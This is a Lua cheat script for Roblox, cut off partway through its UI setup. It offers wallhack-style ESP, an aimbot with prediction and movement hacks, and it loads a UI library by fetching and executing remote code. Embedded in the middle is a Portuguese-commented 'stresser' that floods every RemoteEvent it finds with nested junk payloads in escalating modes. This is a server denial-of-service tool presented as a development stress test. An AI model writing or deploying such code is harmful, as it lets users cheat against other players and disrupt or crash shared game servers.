local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()

local ESPEnabled = false
local BoxESP = false
local CornerBoxESP = false
local NameESP = false
local DistanceESP = false
local HealthESP = false
local TracerESP = false
local SkeletonESP = false
local TeamCheckEnabled = false

local aimbotSettings = {
    enabled = false,
    fovEnabled = false,
    fov = 120,
    fovColor = Color3.fromRGB(255, 255, 255),
    smoothness = 0.15,
    lockOnTarget = false,
    teamCheck = false,
    visibleCheck = true,
    maxDistance = 500,
    targetPart = "Head",
    predictionEnabled = false,
    predictionAmount = 0.1,
}

local BoxColor = Color3.fromRGB(124, 252, 0)
local CornerBoxColor = Color3.fromRGB(124, 252, 0)
local NameColor = Color3.fromRGB(255, 255, 255)
local DistanceColor = Color3.fromRGB(255, 215, 0)
local TracerColor = Color3.fromRGB(124, 252, 0)
local SkeletonColor = Color3.fromRGB(255, 255, 255)
local HealthBarColorGood = Color3.fromRGB(0, 255, 0)
local HealthBarColorBad = Color3.fromRGB(255, 0, 0)

local ESPObjects = {}
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

local WalkSpeedEnabled = false
local JumpPowerEnabled = false
local NoClipEnabled = false
local FlightEnabled = false
local InfiniteJumpEnabled = false
local GodModeEnabled = false
local HitboxExpanderEnabled = false
local HitboxSize = 10
local HitboxTransparency = 0.5
local OriginalHitboxSizes = {}
local DefaultWalkSpeed = 16
local DefaultJumpPower = 50
local CustomWalkSpeed = 16
local CustomJumpPower = 50
local FlightSpeed = 50
local flying = false
local flyingConnection = nil

local function CreateESP(player)
    local esp = {
        Box = Drawing.new("Square"),
        CornerBox = {
            TopLeft1 = Drawing.new("Line"),
            TopLeft2 = Drawing.new("Line"),
            TopRight1 = Drawing.new("Line"),
            TopRight2 = Drawing.new("Line"),
            BottomLeft1 = Drawing.new("Line"),
            BottomLeft2 = Drawing.new("Line"),
            BottomRight1 = Drawing.new("Line"),
            BottomRight2 = Drawing.new("Line"),
        },
        Name = Drawing.new("Text"),
        Distance = Drawing.new("Text"),
        HealthBar = Drawing.new("Line"),
        HealthBarBackground = Drawing.new("Line"),
        Tracer = Drawing.new("Line"),
        Skeleton = {}
    }
    
    esp.Box.Thickness = 1
    esp.Box.Color = BoxColor
    esp.Box.Transparency = 1
    esp.Box.Filled = false
    esp.Box.Visible = false
    
    for _, line in pairs(esp.CornerBox) do
        line.Thickness = 1
        line.Color = CornerBoxColor
        line.Transparency = 1
        line.Visible = false
    end
    
    local skeletonConnections = {
        {"Head", "UpperTorso"},
        {"UpperTorso", "LowerTorso"},
        {"UpperTorso", "LeftUpperArm"},
        {"LeftUpperArm", "LeftLowerArm"},
        {"LeftLowerArm", "LeftHand"},
        {"UpperTorso", "RightUpperArm"},
        {"RightUpperArm", "RightLowerArm"},
        {"RightLowerArm", "RightHand"},
        {"LowerTorso", "LeftUpperLeg"},
        {"LeftUpperLeg", "LeftLowerLeg"},
        {"LeftLowerLeg", "LeftFoot"},
        {"LowerTorso", "RightUpperLeg"},
        {"RightUpperLeg", "RightLowerLeg"},
        {"RightLowerLeg", "RightFoot"}
    }
    
    for i = 1, #skeletonConnections do
        local line = Drawing.new("Line")
        line.Thickness = 1
        line.Color = SkeletonColor
        line.Transparency = 1
        line.Visible = false
        esp.Skeleton[i] = {line = line, from = skeletonConnections[i][1], to = skeletonConnections[i][2]}
    end
    
    esp.Name.Size = 14
    esp.Name.Center = true
    esp.Name.Outline = true
    esp.Name.Color = NameColor
    esp.Name.Font = Drawing.Fonts.Plex
    esp.Name.Visible = false
    
    esp.Distance.Size = 13
    esp.Distance.Center = true
    esp.Distance.Outline = true
    esp.Distance.Color = DistanceColor
    esp.Distance.Font = Drawing.Fonts.Plex
    esp.Distance.Visible = false
    
    esp.HealthBar.Thickness = 2
    esp.HealthBar.Color = HealthBarColorGood
    esp.HealthBar.Transparency = 1
    esp.HealthBar.Visible = false
    
    esp.HealthBarBackground.Thickness = 2
    esp.HealthBarBackground.Color = Color3.fromRGB(50, 50, 50)
    esp.HealthBarBackground.Transparency = 0.5
    esp.HealthBarBackground.Visible = false
    
    esp.Tracer.Thickness = 2
    esp.Tracer.Color = TracerColor
    esp.Tracer.Transparency = 0.8
    esp.Tracer.Visible = false
    
    ESPObjects[player] = esp
end
--[[
    ADVANCED STRESS TEST SYSTEM - Para testes intensivos de servidor
    Use apenas em ambientes de desenvolvimento!
    AVISO: Este sistema pode sobrecarregar servidores - use com responsabilidade
]]
--[[
    STRESSER OTIMIZADO - Não laga seu cliente
    Técnicas para estressar servidor sem afetar FPS local
]]

local Stresser = {}
Stresser.Active = false

-- Configurações otimizadas
local Config = {
    Interval = 0.1,          -- Intervalo controlado
    BatchSize = 50,          -- Envia em lotes
    UseCoroutines = true,    -- Usa coroutines em vez de spawn
    SmartPayload = true,     -- Payload otimizado
    MaxConcurrent = 3,       -- Menos threads = menos lag local
    QueueMode = true,        -- Enfileira requests
    LowMemoryMode = true     -- Reutiliza tabelas
}

-- Cache de payloads (evita criar novas tabelas sempre)
local PayloadCache = {}
local CacheSize = 0
local MaxCacheSize = 10

-- Função para criar payload LEVE mas efetivo
local function createLightPayload()
    if Config.LowMemoryMode and CacheSize > 0 then
        -- Reutiliza payload do cache
        return PayloadCache[math.random(1, CacheSize)]
    end
    
    -- Cria payload otimizado
    local payload = {
        t = tick(),
        d = {},
        r = math.random(1, 999999)
    }
    
    -- Aninha de forma eficiente
    local current = payload.d
    for i = 1, 100 do
        local new = {i = i, v = string.rep("X", 20)}
        current[1] = new
        current = new
    end
    
    -- Adiciona ao cache
    if Config.LowMemoryMode and CacheSize < MaxCacheSize then
        CacheSize = CacheSize + 1
        PayloadCache[CacheSize] = payload
    end
    
    return payload
end

-- Função para encontrar remotes de forma eficiente
local RemoteCache = nil
local function getRemotes()
    if RemoteCache then return RemoteCache end
    
    local remotes = {}
    local services = {
        game.ReplicatedStorage,
        game.RobloxReplicatedStorage
    }
    
    for _, service in pairs(services) do
        pcall(function()
            for _, obj in pairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(remotes, obj)
                end
            end
        end)
    end
    
    RemoteCache = remotes
    return remotes
end

-- Queue de requests (evita spam instantâneo)
local RequestQueue = {}
local QueueRunning = false

local function processQueue()
    if QueueRunning then return end
    QueueRunning = true
    
    spawn(function()
        while #RequestQueue > 0 and Stresser.Active do
            local request = table.remove(RequestQueue, 1)
            
            pcall(function()
                request.remote:FireServer(request.payload)
            end)
            
            wait(Config.Interval)
        end
        QueueRunning = false
    end)
end

-- Função de envio otimizada
local function sendOptimized(remote, payload)
    if Config.QueueMode then
        -- Adiciona à queue em vez de enviar direto
        table.insert(RequestQueue, {
            remote = remote,
            payload = payload
        })
        
        if not QueueRunning then
            processQueue()
        end
    else
        -- Envia direto (pode lagar mais)
        pcall(function()
            remote:FireServer(payload)
        end)
    end
end

-- Worker thread otimizada
local function createWorker(id)
    return coroutine.create(function()
        local remotes = getRemotes()
        
        if #remotes == 0 then
            warn("[Worker " .. id .. "] Nenhum remote encontrado!")
            return
        end
        
        print("[Worker " .. id .. "] Iniciado com " .. #remotes .. " remotes")
        
        while Stresser.Active do
            -- Cria payload leve
            local payload = createLightPayload()
            
            -- Envia em batch (múltiplos de uma vez)
            for i = 1, Config.BatchSize do
                if not Stresser.Active then break end
                
                local remote = remotes[math.random(1, #remotes)]
                sendOptimized(remote, payload)
            end
            
            -- Yield para não travar o cliente
            coroutine.yield()
            wait(Config.Interval * 2)
        end
    end)
end

-- Sistema de workers com coroutines (mais leve)
local Workers = {}

function Stresser:Start()
    if self.Active then
        warn("[Stresser] Já está rodando!")
        return
    end
    
    self.Active = true
    print("[Stresser] Iniciando modo otimizado...")
    print("[Config] Threads: " .. Config.MaxConcurrent .. " | Batch: " .. Config.BatchSize)
    
    -- Limpa cache se necessário
    if not Config.LowMemoryMode then
        PayloadCache = {}
        CacheSize = 0
    end
    
    -- Cria workers
    Workers = {}
    for i = 1, Config.MaxConcurrent do
        Workers[i] = createWorker(i)
    end
    
    -- Loop de execução otimizado
    spawn(function()
        while self.Active do
            -- Resume workers usando coroutines (não trava)
            for i, worker in pairs(Workers) do
                if coroutine.status(worker) == "suspended" then
                    local success = coroutine.resume(worker)
                    if not success then
                        -- Recria worker se morreu
                        Workers[i] = createWorker(i)
                    end
                end
            end
            
            wait(0.5) -- Pausa entre ciclos
        end
    end)
    
    print("[Stresser] Sistema ativo! FPS local deve permanecer normal.")
end

function Stresser:Stop()
    if not self.Active then
        warn("[Stresser] Não está rodando!")
        return
    end
    
    self.Active = false
    Workers = {}
    RequestQueue = {}
    QueueRunning = false
    
    print("[Stresser] Parado!")
end

-- Modo econômico (mínimo impacto local)
function Stresser:EcoMode()
    print("[Stresser] Modo econômico ativado")
    
    Config.Interval = 0.2
    Config.BatchSize = 20
    Config.MaxConcurrent = 2
    Config.QueueMode = true
    Config.LowMemoryMode = true
    
    self:Start()
end

-- Modo balanceado
function Stresser:Balanced()
    print("[Stresser] Modo balanceado ativado")
    
    Config.Interval = 0.1
    Config.BatchSize = 50
    Config.MaxConcurrent = 3
    Config.QueueMode = true
    Config.LowMemoryMode = true
    
    self:Start()
end

-- Modo agressivo (pode lagar um pouco)
function Stresser:Aggressive()
    print("[Stresser] Modo agressivo ativado")
    
    Config.Interval = 0.05
    Config.BatchSize = 100
    Config.MaxConcurrent = 5
    Config.QueueMode = false
    Config.LowMemoryMode = false
    
    self:Start()
end

function Stresser:Configure(settings)
    for key, value in pairs(settings) do
        if Config[key] ~= nil then
            Config[key] = value
        end
    end
end

-- Limpar cache manualmente
function Stresser:ClearCache()
    PayloadCache = {}
    CacheSize = 0
    RemoteCache = nil
    print("[Stresser] Cache limpo!")
end

-- Comandos globais
_G.Stresser = Stresser
_G.StartStress = function() Stresser:Balanced() end
_G.StopStress = function() Stresser:Stop() end

print([[
========================================
STRESSER OTIMIZADO CARREGADO
========================================
✅ Otimizado para NÃO lagar seu cliente
✅ Usa coroutines em vez de threads
✅ Sistema de queue e cache
✅ Reutiliza memória

Comandos:
  _G.StartStress()         - Inicia (modo balanceado)
  _G.StopStress()          - Para
  
  _G.Stresser:EcoMode()    - Mínimo impacto local
  _G.Stresser:Balanced()   - Balanceado (recomendado)
  _G.Stresser:Aggressive() - Máximo stress (pode lagar)
  
  _G.Stresser:ClearCache() - Limpa cache de memória
  
Dicas para não lagar:
• Use EcoMode() se seu PC for fraco
• Balanced() é o melhor equilíbrio
• Aggressive() só em PCs bons
========================================
]])

local function RemoveESP(player)
    local esp = ESPObjects[player]
    if esp then
        esp.Box:Remove()
        for _, line in pairs(esp.CornerBox) do
            line:Remove()
        end
        for _, skelData in pairs(esp.Skeleton) do
            skelData.line:Remove()
        end
        esp.Name:Remove()
        esp.Distance:Remove()
        esp.HealthBar:Remove()
        esp.HealthBarBackground:Remove()
        esp.Tracer:Remove()
        ESPObjects[player] = nil
    end
end

local function UpdateESP()
    for player, esp in pairs(ESPObjects) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") then
            local hrp = player.Character.HumanoidRootPart
            local humanoid = player.Character.Humanoid
            local head = player.Character:FindFirstChild("Head")
            
            local vector, onScreen = Camera:WorldToViewportPoint(hrp.Position)
            
            local shouldShowESP = true
            if TeamCheckEnabled then
                if player.Team and LocalPlayer.Team and player.Team == LocalPlayer.Team then
                    shouldShowESP = false
                end
            end

            if onScreen and ESPEnabled and shouldShowESP then
                local hrpVector = Camera:WorldToViewportPoint(hrp.Position)
                local headVector = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.5, 0))
                local legVector = Camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 3, 0))
                
                local height = math.abs(headVector.Y - legVector.Y)
                local width = height / 2
                
                esp.Box.Color = BoxColor
                for _, line in pairs(esp.CornerBox) do
                    line.Color = CornerBoxColor
                end
                for _, skelData in pairs(esp.Skeleton) do
                    skelData.line.Color = SkeletonColor
                end
                esp.Name.Color = NameColor
                esp.Distance.Color = DistanceColor
                esp.Tracer.Color = TracerColor
                
                if BoxESP then
                    esp.Box.Size = Vector2.new(width, height)
                    esp.Box.Position = Vector2.new(hrpVector.X - width / 2, hrpVector.Y - height / 2)
                    esp.Box.Visible = true
                else
                    esp.Box.Visible = false
                end
                
                if CornerBoxESP then
                    local cornerLength = math.min(width, height) / 4
                    
                    esp.CornerBox.TopLeft1.From = Vector2.new(hrpVector.X - width / 2, hrpVector.Y - height / 2)
                    esp.CornerBox.TopLeft1.To = Vector2.new(hrpVector.X - width / 2 + cornerLength, hrpVector.Y - height / 2)
                    esp.CornerBox.TopLeft2.From = Vector2.new(hrpVector.X - width / 2, hrpVector.Y - height / 2)
                    esp.CornerBox.TopLeft2.To = Vector2.new(hrpVector.X - width / 2, hrpVector.Y - height / 2 + cornerLength)
                    
                    esp.CornerBox.TopRight1.From = Vector2.new(hrpVector.X + width / 2, hrpVector.Y - height / 2)
                    esp.CornerBox.TopRight1.To = Vector2.new(hrpVector.X + width / 2 - cornerLength, hrpVector.Y - height / 2)
                    esp.CornerBox.TopRight2.From = Vector2.new(hrpVector.X + width / 2, hrpVector.Y - height / 2)
                    esp.CornerBox.TopRight2.To = Vector2.new(hrpVector.X + width / 2, hrpVector.Y - height / 2 + cornerLength)
                    
                    esp.CornerBox.BottomLeft1.From = Vector2.new(hrpVector.X - width / 2, hrpVector.Y + height / 2)
                    esp.CornerBox.BottomLeft1.To = Vector2.new(hrpVector.X - width / 2 + cornerLength, hrpVector.Y + height / 2)
                    esp.CornerBox.BottomLeft2.From = Vector2.new(hrpVector.X - width / 2, hrpVector.Y + height / 2)
                    esp.CornerBox.BottomLeft2.To = Vector2.new(hrpVector.X - width / 2, hrpVector.Y + height / 2 - cornerLength)
                    
                    esp.CornerBox.BottomRight1.From = Vector2.new(hrpVector.X + width / 2, hrpVector.Y + height / 2)
                    esp.CornerBox.BottomRight1.To = Vector2.new(hrpVector.X + width / 2 - cornerLength, hrpVector.Y + height / 2)
                    esp.CornerBox.BottomRight2.From = Vector2.new(hrpVector.X + width / 2, hrpVector.Y + height / 2)
                    esp.CornerBox.BottomRight2.To = Vector2.new(hrpVector.X + width / 2, hrpVector.Y + height / 2 - cornerLength)
                    
                    for _, line in pairs(esp.CornerBox) do
                        line.Visible = true
                    end
                else
                    for _, line in pairs(esp.CornerBox) do
                        line.Visible = false
                    end
                end
                
                if SkeletonESP and player.Character:FindFirstChild("UpperTorso") then
                    for _, skelData in pairs(esp.Skeleton) do
                        local fromPart = player.Character:FindFirstChild(skelData.from)
                        local toPart = player.Character:FindFirstChild(skelData.to)
                        
                        if fromPart and toPart then
                            local fromPos, fromVis = Camera:WorldToViewportPoint(fromPart.Position)
                            local toPos, toVis = Camera:WorldToViewportPoint(toPart.Position)
                            
                            if fromVis and toVis then
                                skelData.line.From = Vector2.new(fromPos.X, fromPos.Y)
                                skelData.line.To = Vector2.new(toPos.X, toPos.Y)
                                skelData.line.Visible = true
                            else
                                skelData.line.Visible = false
                            end
                        else
                            skelData.line.Visible = false
                        end
                    end
                else
                    for _, skelData in pairs(esp.Skeleton) do
                        skelData.line.Visible = false
                    end
                end
                
                if NameESP then
                    esp.Name.Text = player.Name
                    esp.Name.Position = Vector2.new(hrpVector.X, headVector.Y - 18)
                    esp.Name.Visible = true
                else
                    esp.Name.Visible = false
                end
                
                if DistanceESP then
                    local distance = math.floor((hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude)
                    esp.Distance.Text = distance .. "m"
                    esp.Distance.Position = Vector2.new(hrpVector.X, legVector.Y + 8)
                    esp.Distance.Visible = true
                else
                    esp.Distance.Visible = false
                end
                
                if HealthESP then
                    local healthPercent = humanoid.Health / humanoid.MaxHealth
                    local barHeight = height * healthPercent
                    
                    local r = HealthBarColorBad.R * (1 - healthPercent) + HealthBarColorGood.R * healthPercent
                    local g = HealthBarColorBad.G * (1 - healthPercent) + HealthBarColorGood.G * healthPercent
                    local b = HealthBarColorBad.B * (1 - healthPercent) + HealthBarColorGood.B * healthPercent
                    
                    esp.HealthBarBackground.From = Vector2.new(hrpVector.X - width / 2 - 6, legVector.Y)
                    esp.HealthBarBackground.To = Vector2.new(hrpVector.X - width / 2 - 6, headVector.Y)
                    esp.HealthBarBackground.Visible = true
                    
                    esp.HealthBar.From = Vector2.new(hrpVector.X - width / 2 - 6, legVector.Y)
                    esp.HealthBar.To = Vector2.new(hrpVector.X - width / 2 - 6, legVector.Y - barHeight)
                    esp.HealthBar.Color = Color3.new(r, g, b)
                    esp.HealthBar.Visible = true
                else
                    esp.HealthBar.Visible = false
                    esp.HealthBarBackground.Visible = false
                end
                
                if TracerESP then
                    esp.Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                    esp.Tracer.To = Vector2.new(hrpVector.X, hrpVector.Y)
                    esp.Tracer.Visible = true
                else
                    esp.Tracer.Visible = false
                end
            else
                esp.Box.Visible = false
                for _, line in pairs(esp.CornerBox) do
                    line.Visible = false
                end
                for _, skelData in pairs(esp.Skeleton) do
                    skelData.line.Visible = false
                end
                esp.Name.Visible = false
                esp.Distance.Visible = false
                esp.HealthBar.Visible = false
                esp.HealthBarBackground.Visible = false
                esp.Tracer.Visible = false
            end
        else
            esp.Box.Visible = false
            for _, line in pairs(esp.CornerBox) do
                line.Visible = false
            end
            for _, skelData in pairs(esp.Skeleton) do
                skelData.line.Visible = false
            end
            esp.Name.Visible = false
            esp.Distance.Visible = false
            esp.HealthBar.Visible = false
            esp.HealthBarBackground.Visible = false
            esp.Tracer.Visible = false
        end
    end
end

local fovCircle = Drawing.new("Circle")
fovCircle.Thickness = 2
fovCircle.Filled = false
fovCircle.Color = aimbotSettings.fovColor
fovCircle.Visible = false
fovCircle.ZIndex = 1
fovCircle.NumSides = 64

local function updateFovCircle()
    if aimbotSettings.fovEnabled and aimbotSettings.enabled then
        local res = Camera.ViewportSize
        fovCircle.Position = Vector2.new(res.X/2, res.Y/2)
        fovCircle.Radius = aimbotSettings.fov
        fovCircle.Color = aimbotSettings.fovColor
        fovCircle.Visible = true
    else
        fovCircle.Visible = false
    end
end

local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
raycastParams.IgnoreWater = true

local function isPlayerVisible(targetPlayer)
    if not aimbotSettings.visibleCheck then
        return true
    end
    
    local localChar = LocalPlayer.Character
    if not localChar or not localChar:FindFirstChild("HumanoidRootPart") then
        return false
    end
    
    local targetChar = targetPlayer.Character
    if not targetChar or not targetChar:FindFirstChild(aimbotSettings.targetPart) then
        return false
    end
    
    local targetPart = targetChar:FindFirstChild(aimbotSettings.targetPart)
    local origin = Camera.CFrame.Position
    local direction = (targetPart.Position - origin)
    local distance = direction.Magnitude
    
    raycastParams.FilterDescendantsInstances = {localChar, Camera}
    
    local raycastResult = workspace:Raycast(origin, direction.Unit * distance, raycastParams)
    
    if not raycastResult then
        return true
    end
    
    local hitPart = raycastResult.Instance
    return hitPart and (hitPart:IsDescendantOf(targetChar))
end

local function isValidAimbotTarget(player)
    if player == LocalPlayer then return false end
    if not player.Character then return false end
    
    local targetPart = player.Character:FindFirstChild(aimbotSettings.targetPart)
    if not targetPart then return false end
    
    local humanoid = player.Character:FindFirstChild("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return false end
    
    if aimbotSettings.teamCheck then
        if player.Team and LocalPlayer.Team and player.Team == LocalPlayer.Team then
            return false
        end
    end
    
    return true
end

local currentTarget = nil

local function getClosestPlayerToCenter()
    local closestPlayer = nil
    local closestDistance = math.huge
    local screenCenter = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    local localChar = LocalPlayer.Character
    
    if not localChar or not localChar:FindFirstChild("HumanoidRootPart") then return nil end

    for _, player in pairs(Players:GetPlayers()) do
        if isValidAimbotTarget(player) then
            local targetPart = player.Character:FindFirstChild(aimbotSettings.targetPart)
            if targetPart then
                local dist = (localChar.HumanoidRootPart.Position - targetPart.Position).Magnitude
                if dist > aimbotSettings.maxDistance then
                    continue
                end

                if not isPlayerVisible(player) then
                    continue
                end

                local partPos, visible = Camera:WorldToViewportPoint(targetPart.Position)
                if visible then
                    local distanceOnScreen = (screenCenter - Vector2.new(partPos.X, partPos.Y)).Magnitude
                    if distanceOnScreen <= aimbotSettings.fov and distanceOnScreen < closestDistance then
                        closestDistance = distanceOnScreen
                        closestPlayer = player
                    end
                end
            end
        end
    end
    
    return closestPlayer
end

local function aimAtTarget(target)
    if not target or not target.Character then return end
    
    local targetPart = target.Character:FindFirstChild(aimbotSettings.targetPart)
    if not targetPart then return end
    
    local partPos, visible = Camera:WorldToViewportPoint(targetPart.Position)
    if not visible then return end
    
    local targetPosition = targetPart.Position
    
    if aimbotSettings.predictionEnabled then
        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        if targetHRP then
            local velocity = targetHRP.AssemblyLinearVelocity
            targetPosition = targetPosition + (velocity * aimbotSettings.predictionAmount)
        end
    end
    
    local cameraCFrame = Camera.CFrame
    local cameraPosition = cameraCFrame.Position
    
    local newCFrame = CFrame.lookAt(cameraPosition, targetPosition)
    
    local smoothFactor = math.clamp(aimbotSettings.smoothness, 0.01, 1)
    Camera.CFrame = cameraCFrame:Lerp(newCFrame, smoothFactor)
end

local Window = Library:CreateWindow({
    Title = "",
    Footer = "paid script",
    DisableSearch = true,
    CornerRadius = 16,
    SidebarCompactWidth = 60,
    Font = Enum.Font.Gotham,
    ToggleKeybind = Enum.KeyCode.Insert,
    Resizable = false,
    Icon = 9405930424,
    NotifySide = "Right",
})

Window:SetSidebarWidth(70)

ThemeManager:SetLibrary(Library)
ThemeManager:SetFolder("MyScriptHub")
ThemeManager:SetDefaultTheme({
    FontColor = Color3.fromRGB(220, 220, 220),
    MainColor = Color3.fromRGB(15, 18, 20),
    AccentColor = Color3.fromRGB(124, 252, 0),
    BackgroundColor = Color3.fromRGB(10, 12, 14),
    OutlineColor = Color3.fromRGB(40, 45, 50),
})

local ESPTab = Window:AddTab("ESP", "eye")
local AimbotTab = Window:AddTab("Aimbot", "crosshair")
local LocalPlayerTab = Window:AddTab("Local Player", "user")
local PlayersTab = Window:AddTab("Players", "users")

local ESPLeftGroupBox = ESPTab:AddLeftGroupbox("ESP Settings", "crosshair")
local ESPRightGroupBox = ESPTab:AddRightGroupbox("ESP Colors")

ESPLeftGroupBox:AddToggle("MainESP", {
    Text = "Enable ESP",
    Default = false,
    Callback = function(value)
        ESPEnabled = value
        if not value then
            for _, esp in pairs(ESPObjects) do
                esp.Box.Visible = false
                for _, line in pairs(esp.CornerBox) do
                    line.Visible = false
                end
                for _, skelData in pairs(esp.Skeleton) do
                    skelData.line.Visible = false
                end
                esp.Name.Visible = false
                esp.Distance.Visible = false
                esp.HealthBar.Visible = false
                esp.HealthBarBackground.Visible = false
                esp.Tracer.Visible = false
            end
        end
    end
})

ESPLeftGroupBox:AddDivider()

local BoxToggle = ESPLeftGroupBox:AddToggle("BoxESP", {
    Text = "Box ESP",
    Default = false,
    Callback = function(value)
        BoxESP = value
    end
})

BoxToggle:AddColorPicker("BoxColor", {
    Default = Color3.fromRGB(124, 252, 0),
    Title = "Box Color",
    Callback = function(value)
        BoxColor = value
    end
})

local CornerBoxToggle = ESPLeftGroupBox:AddToggle("CornerBoxESP", {
    Text = "Corner Box (CS:GO)",
    Default = false,
    Callback = function(value)
        CornerBoxESP = value
    end
})

CornerBoxToggle:AddColorPicker("CornerBoxColor", {
    Default = Color3.fromRGB(124, 252, 0),
    Title = "Corner Box Color",
    Callback = function(value)
        CornerBoxColor = value
    end
})

local SkeletonToggle = ESPLeftGroupBox:AddToggle("SkeletonESP", {
    Text = "Skeleton ESP",
    Default = false,
    Callback = function(value)
        SkeletonESP = value
    end
})

SkeletonToggle:AddColorPicker("SkeletonColor", {
    Default = Color3.fromRGB(255, 255, 255),
    Title = "Skeleton Color",
    Callback = function(value)
        SkeletonColor = value
    end
})

local NameToggle = ESPLeftGroupBox:AddToggle("NameESP", {
    Text = "Name ESP",
    Default = false,
    Callback = function(value)
        NameESP = value
    end
})

NameToggle:AddColorPicker("NameColor", {
    Default = Color3.fromRGB(255, 255, 255),
    Title = "Name Color",
    Callback = function(value)
        NameColor = value
    end
})

local DistanceToggle = ESPLeftGroupBox:AddToggle("DistanceESP", {
    Text = "Distance ESP",
    Default = false,
    Callback = function(value)
        DistanceESP = value
    end
})

DistanceToggle:AddColorPicker("DistanceColor", {
    Default = Color3.fromRGB(255, 215, 0),
    Title = "Distance Color",
    Callback = function(value)
        DistanceColor = value
    end
})

local TracerToggle = ESPLeftGroupBox:AddToggle("TracerESP", {
    Text = "Tracers",
    Default = false,
    Callback = function(value)
        TracerESP = value
    end
})

TracerToggle:AddColorPicker("TracerColor", {
    Default = Color3.fromRGB(124, 252, 0),
    Title = "Tracer Color",
    Callback = function(value)
        TracerColor = value
    end
})

ESPRightGroupBox:AddLabel("Health Bar Colors"):AddColorPicker("HealthColorGood", {
    Default = Color3.fromRGB(0, 255, 0),
    Title = "Full Health Color",
    Callback = function(value)
        HealthBarColorGood = value
    end
})

ESPRightGroupBox:AddLabel(""):AddColorPicker("HealthColorBad", {
    Default = Color3.fromRGB(255, 0, 0),
    Title = "Low Health Color",
    Callback = function(value)
        HealthBarColorBad = value
    end
})

ESPRightGroupBox:AddDivider()

ESPRightGroupBox:AddToggle("HealthESP", {
    Text = "Health Bar",
    Default = false,
    Callback = function(value)
        HealthESP = value
    end
})

ESPRightGroupBox:AddDivider()

ESPRightGroupBox:AddToggle("TeamCheck", {
    Text = "Team Check (Hide Teammates)",
    Default = false,
    Callback = function(value)
        TeamCheckEnabled = value
    end
})

local AimbotSettingsBox = AimbotTab:AddLeftGroupbox("Aimbot Settings", "target")
local AimbotVisualsBox = AimbotTab:AddRightGroupbox("Visuals & Options")

AimbotSettingsBox:AddToggle("AimbotEnabled", {
    Text = "Enable Aimbot",
    Default = false,
    Callback = function(value)
        aimbotSettings.enabled = value
    end
})

AimbotSettingsBox:AddSlider("AimbotSmoothness", {
    Text = "Smoothness",
    Default = 0.15,
    Min = 0.01,
    Max = 1,
    Rounding = 2,
    Compact = false,
    Callback = function(value)
        aimbotSettings.smoothness = value
    end
})

AimbotSettingsBox:AddSlider("AimbotFOV", {
    Text = "FOV Radius",
    Default = 120,
    Min = 50,
    Max = 500,
    Rounding = 0,
    Compact = false,
    Callback = function(value)
        aimbotSettings.fov = value
    end
})

AimbotSettingsBox:AddSlider("MaxDistance", {
    Text = "Max Distance",
    Default = 500,
    Min = 100,
    Max = 2000,
    Rounding = 0,
    Compact = false,
    Callback = function(value)
        aimbotSettings.maxDistance = value
    end
})

AimbotSettingsBox:AddDivider()

AimbotSettingsBox:AddDropdown("TargetPart", {
    Values = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"},
    Default = 1,
    Multi = false,
    Text = "Target Part",
    Callback = function(value)
        aimbotSettings.targetPart = value
    end
})

AimbotSettingsBox:AddToggle("AimbotVisibleCheck", {
    Text = "Visible Check (Wall Check)",
    Default = true,
    Callback = function(value)
        aimbotSettings.visibleCheck = value
    end
})

AimbotSettingsBox:AddToggle("AimbotTeamCheck", {
    Text = "Team Check (Ignore Team)",
    Default = false,
    Callback = function(value)
        aimbotSettings.teamCheck = value
    end
})

AimbotSettingsBox:AddDivider()

AimbotSettingsBox:AddToggle("PredictionEnabled", {
    Text = "Prediction",
    Default = false,
    Callback = function(value)
        aimbotSettings.predictionEnabled = value
    end
})

AimbotSettingsBox:AddSlider("PredictionAmount", {
    Text = "Prediction Amount",
    Default = 0.1,
    Min = 0,
Max = 0.5,
Rounding = 2,
Compact = false,
Callback = function(value)
aimbotSettings.predictionAmount = value
end
})
local FOVCircleToggle = AimbotVisualsBox:AddToggle("ShowFOVCircle", {
Text = "Show FOV Circle",
Default = false,
Callback = function(value)
aimbotSettings.fovEnabled = value
end
})
FOVCircleToggle:AddColorPicker("FOVCircleColor", {
Default = Color3.fromRGB(255, 255, 255),
Title = "FOV Circle Color",
Callback = function(value)
aimbotSettings.fovColor = value
fovCircle.Color = value
end
})
AimbotVisualsBox:AddDivider()
AimbotVisualsBox:AddLabel("Aimbot Info:")
AimbotVisualsBox:AddLabel("• Activate when enabled")
AimbotVisualsBox:AddLabel("• Lower smoothness = faster")
AimbotVisualsBox:AddLabel("• Higher smoothness = smoother")
AimbotVisualsBox:AddLabel("• Prediction for moving targets")
local MovementGroupBox = LocalPlayerTab:AddLeftGroupbox("Movement")
local CharacterGroupBox = LocalPlayerTab:AddRightGroupbox("Character")
local WalkSpeedToggle = MovementGroupBox:AddToggle("WalkSpeed", {
Text = "Custom WalkSpeed",
Default = false,
Callback = function(value)
WalkSpeedEnabled = value
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
if value then
LocalPlayer.Character.Humanoid.WalkSpeed = CustomWalkSpeed
else
LocalPlayer.Character.Humanoid.WalkSpeed = DefaultWalkSpeed
end
end
end
})
MovementGroupBox:AddSlider("WalkSpeedSlider", {
Text = "Speed",
Default = 16,
Min = 16,
Max = 500,
Rounding = 0,
Compact = false,
Callback = function(value)
CustomWalkSpeed = value
if WalkSpeedEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
LocalPlayer.Character.Humanoid.WalkSpeed = value
end
end
})
local JumpPowerToggle = MovementGroupBox:AddToggle("JumpPower", {
